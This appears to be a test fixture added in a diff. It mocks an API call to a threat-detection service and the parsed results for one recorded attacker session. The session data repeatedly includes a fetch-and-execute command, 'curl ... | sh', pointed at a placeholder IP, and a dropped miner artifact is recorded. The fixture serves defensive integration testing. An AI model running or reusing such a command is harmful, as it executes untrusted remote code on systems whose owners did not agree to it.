@@ -1,0 +1,137 @@
+{
+  "args": {
+    "workspace_id": "7c9e6679-7425-40de-944b-e07fc1f90ae7",
+    "detection_id": "9d4e2f7a-1b3c-4d5e-8f6a-7b8c9d0e1f2a"
+  },
+  "exchanges": [
+    {
+      "request": {
+        "method": "GET",
+        "path": "/v3/workspaces/7c9e6679-7425-40de-944b-e07fc1f90ae7/tactics/9d4e2f7a-1b3c-4d5e-8f6a-7b8c9d0e1f2a",
+        "headers": {
+          "key": "gn-key-0123456789abcdefghijklmnopqrstuvwxyzABCDEFGH"
+        }
+      },
+      "response": {
+        "status": 200,
+        "json": {
+          "session_id": "9d4e2f7a-1b3c-4d5e-8f6a-7b8c9d0e1f2a",
+          "workspace_id": "7c9e6679-7425-40de-944b-e07fc1f90ae7",
+          "sensor_id": "1a2b3c4d-5e6f-4a7b-8c9d-0e1f2a3b4c5d",
+          "start_time": "2026-07-29T10:00:00Z",
+          "end_time": "2026-07-29T10:05:00Z",
+          "initial_process_name": "curl",
+          "initial_process_parent": "bash",
+          "rules": [
+            "command_run",
+            "internet_access"
+          ],
+          "techniques": [
+            "T1082",
+            "T1059.004"
+          ],
+          "tactics": [
+            "TA0007",
+            "TA0002"
+          ],
+          "commands": [
+            "uname -a",
+            "curl -s http://198.51.100.42/x | sh"
+          ],
+          "executable_paths": [
+            "/usr/bin/curl"
+          ],
+          "artifacts": [
+            {
+              "path": "/tmp/.x/miner",
+              "sha256": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
+            }
+          ],
+          "interactive": true,
+          "command_count": 2,
+          "commands_page": 1,
+          "commands_page_size": 500,
+          "commands_has_more": false,
+          "command_events": [
+            {
+              "timestamp": "2026-07-29T10:00:01Z",
+              "command": "uname -a",
+              "techniques": [
+                "T1082"
+              ]
+            },
+            {
+              "timestamp": "2026-07-29T10:00:04Z",
+              "command": "curl -s http://198.51.100.42/x | sh",
+              "techniques": [
+                "T1059.004"
+              ]
+            }
+          ],
+          "artifact_count": 1,
+          "artifacts_page": 1,
+          "artifacts_page_size": 500,
+          "artifacts_has_more": false,
+          "dest_ips": {
+            "internet": {
+              "tcp": 1
+            },
+            "lateral": {}
+          }
+        }
+      }
+    }
+  ],
+  "outputs": {
+    "session_id": "9d4e2f7a-1b3c-4d5e-8f6a-7b8c9d0e1f2a",
+    "start_time": "2026-07-29T10:00:00Z",
+    "end_time": "2026-07-29T10:05:00Z",
+    "techniques": [
+      "T1082",
+      "T1059.004"
+    ],
+    "tactics": [
+      "TA0007",
+      "TA0002"
+    ],
+    "rules": [
+      "command_run",
+      "internet_access"
+    ],
+    "commands": [
+      "uname -a",
+      "curl -s http://198.51.100.42/x | sh"
+    ],
+    "command_events": [
+      {
+        "timestamp": "2026-07-29T10:00:01Z",
+        "command": "uname -a",
+        "techniques": [
+          "T1082"
+        ]
+      },
+      {
+        "timestamp": "2026-07-29T10:00:04Z",
+        "command": "curl -s http://198.51.100.42/x | sh",
+        "techniques": [
+          "T1059.004"
+        ]
+      }
+    ],
+    "commands_has_more": false,
+    "artifacts": [
+      {
+        "path": "/tmp/.x/miner",
+        "sha256": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
+      }
+    ],
+    "artifacts_has_more": false,
+    "dest_ips": {
+      "internet": {
+        "tcp": 1
+      },
+      "lateral": {}
+    },
+    "interactive": true
+  }
+}
